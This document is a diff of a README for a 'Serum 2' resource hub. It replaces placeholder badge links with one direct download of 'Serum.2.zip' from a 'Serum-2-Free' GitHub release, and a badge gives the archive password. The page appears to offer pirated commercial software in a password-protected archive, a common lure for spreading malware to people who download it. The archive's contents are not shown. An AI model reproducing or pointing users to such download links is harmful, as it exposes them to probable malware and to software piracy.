@@ -1,16 +1,16 @@
 # 🎹 Serum 2 — Complete Resource Hub
 
 <p align="center">
-  <a href="YOUR_VERSION_LINK">
+  <a href="https://github.com/sam-v-hq99v4/Serum-2-Free/releases/download/v2.1.2/Serum.2.zip">
     <img src="https://img.shields.io/badge/VERSION-2.1.2-5865F2?style=for-the-badge&logo=gitbook&logoColor=white">
   </a>
-  <a href="YOUR_RELEASE_LINK">
+  <a href="https://github.com/sam-v-hq99v4/Serum-2-Free/releases/download/v2.1.2/Serum.2.zip">
     <img src="https://img.shields.io/badge/RELEASE-2026-57F287?style=for-the-badge&logo=github&logoColor=white">
   </a>
-  <a href="YOUR_UPDATE_LINK">
+  <a href="https://github.com/sam-v-hq99v4/Serum-2-Free/releases/download/v2.1.2/Serum.2.zip">
     <img src="https://img.shields.io/badge/LAST%20UPDATE-07.09.2026-FEE75C?style=for-the-badge&logo=calendar&logoColor=black">
   </a>
-  <a href="YOUR_DOWNLOAD_LINK">
+  <a href="https://github.com/sam-v-hq99v4/Serum-2-Free/releases/download/v2.1.2/Serum.2.zip">
     <img src="https://img.shields.io/badge/PASSW0RD-212-ED4245?style=for-the-badge&logo=keycdn&logoColor=white">
   </a>
 </p>
